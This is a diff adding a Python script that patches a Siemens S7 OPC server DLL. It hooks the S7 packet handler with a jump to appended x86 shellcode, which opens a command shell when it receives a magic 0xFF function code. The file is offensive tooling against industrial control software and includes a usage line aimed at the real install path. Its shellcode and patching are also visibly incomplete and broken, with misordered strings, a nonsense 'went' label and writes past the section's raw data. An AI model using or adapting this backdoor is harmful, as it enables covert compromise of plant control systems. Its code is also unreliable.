@@ -1,0 +1,77 @@
+# s7_app_backdoor.py - Inject backdoor into S7 communication handler
+# Modifies s7oiehsx.dll (S7 OPC server DLL) or plcsim executable
+
+import pefile
+import struct
+
+def inject_s7_backdoor(target_dll, output_dll):
+    """
+    Inject backdoor into Siemens S7 application DLL
+    Backdoor activates on specific S7 function code
+    """
+    pe = pefile.PE(target_dll)
+
+    # Locate S7 packet handling function (reverse engineered)
+    # Signature: 55 8B EC 83 EC 40 53 56 57 (push ebp; mov ebp, esp; sub esp, 0x40; ...)
+    s7_handler_signature = b'\x55\x8B\xEC\x83\xEC\x40\x53\x56\x57'
+
+    # Find signature in .text section
+    for section in pe.sections:
+        if section.Name.startswith(b'.text'):
+            offset = section.get_data().find(s7_handler_signature)
+            if offset != -1:
+                print(f"[+] Found S7 handler at offset: 0x{offset:x}")
+
+                # Inject hook at function prologue
+                # Original: 55 8B EC 83 EC 40
+                # Modified: E9 XX XX XX XX (jmp to backdoor code)
+
+                backdoor_offset = len(section.get_data())  # Append to end
+                jmp_offset = backdoor_offset - (offset + 5)
+                hook = b'\xE9' + struct.pack('<i', jmp_offset)
+
+                # Backdoor shellcode (x86)
+                backdoor_code = assemble_backdoor_shellcode()
+
+                # Patch binary
+                pe.set_bytes_at_offset(section.PointerToRawData + offset, hook)
+                pe.set_bytes_at_offset(section.PointerToRawData + backdoor_offset, backdoor_code)
+
+    # Write modified PE
+    pe.write(filename=output_dll)
+    print(f"[+] Backdoored DLL saved to {output_dll}")
+
+def assemble_backdoor_shellcode():
+    """
+    x86 shellcode that:
+    1. Checks if S7 function code is 0xFF (magic trigger)
+    2. If yes, execute payload (reverse shell, modify logic, etc.)
+    3. Otherwise, execute original handler
+    """
+    shellcode = bytes([
+        # Check S7 function code (at [ebp+8])
+        0x8B, 0x45, 0x08,              # mov eax, [ebp+8]
+        0x80, 0x38, 0xFF,              # cmp byte ptr [eax], 0xFF
+        0x75, 0x10,                    # jne original_handler
+
+        # Backdoor payload: spawn cmd.exe
+        0x33, 0xC9,                    # xor ecx, ecx
+        0x51,                          # push ecx (null terminator)
+        0x68, 0x2E, 0x65, 0x78, 0x65, # push ".exe"
+        0x68, 0x63, 0x6D, 0x64, 0x20, # push "cmd "
+        0x54,                          # push esp
+        0x68, 0x77, 0x65, 0x6E, 0x74, # push "went" (WinExec)
+        # ... (simplified, full shellcode would use WinExec or CreateProcess)
+
+        # original_handler:
+        # Jump back to original function (restore prologue + continue)
+        0x55,                          # push ebp
+        0x8B, 0xEC,                    # mov ebp, esp
+        0x83, 0xEC, 0x40,              # sub esp, 0x40
+        0xE9, 0x00, 0x00, 0x00, 0x00  # jmp [original+5] (patched at runtime)
+    ])
+
+    return shellcode
+
+# Usage
+inject_s7_backdoor("C:\\Program Files\\Siemens\\S7\\s7oiehsx.dll", "s7oiehsx_backdoored.dll")
